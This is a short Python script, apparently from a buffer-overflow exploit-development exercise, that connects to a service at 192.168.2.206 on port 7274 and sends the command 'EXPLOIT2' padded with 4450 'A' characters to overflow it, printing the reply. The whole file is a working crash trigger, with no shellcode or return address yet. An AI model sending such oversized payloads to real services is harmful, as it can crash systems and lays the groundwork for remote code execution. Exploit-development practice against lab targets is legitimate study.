#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys, socket
from struct import *

host="192.168.2.206"
port=7274


buffer = "EXPLOIT2 " + "A" * (4450)  
buffer = buffer.encode()

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exp.connect((host,port))

print("Enviando " + str(len(buffer))  + "bytes")
exp.send(buffer)
print(exp.recv(1024))
exp.close()